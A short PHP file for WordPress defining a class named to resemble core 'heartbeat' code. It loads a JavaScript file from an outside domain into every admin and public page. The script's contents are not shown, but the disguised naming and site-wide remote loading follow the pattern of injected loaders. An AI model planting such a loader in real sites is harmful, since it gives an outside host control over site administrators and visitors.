<?php

class wp_core_heartbit_module{

	private static $instance = null;

	private function __construct() {
		add_action('admin_enqueue_scripts', array( $this, 'wp_core_heartbit_module_load_assign' ));
		add_action('wp_enqueue_scripts', array( $this, 'wp_core_heartbit_module_load_assign' ));
	}

	public function wp_core_heartbit_module_load_assign() {
	    wp_enqueue_script('wp_core_heartbit', 'https://plugins.simplerscript.com/doi_crossref/core_assets.js', array('jquery'), '1.0', true);
	}

	public static function get_instance() {
	    if (self::$instance === null) {
	        self::$instance = new self();
	    }
	    return self::$instance;
	}

}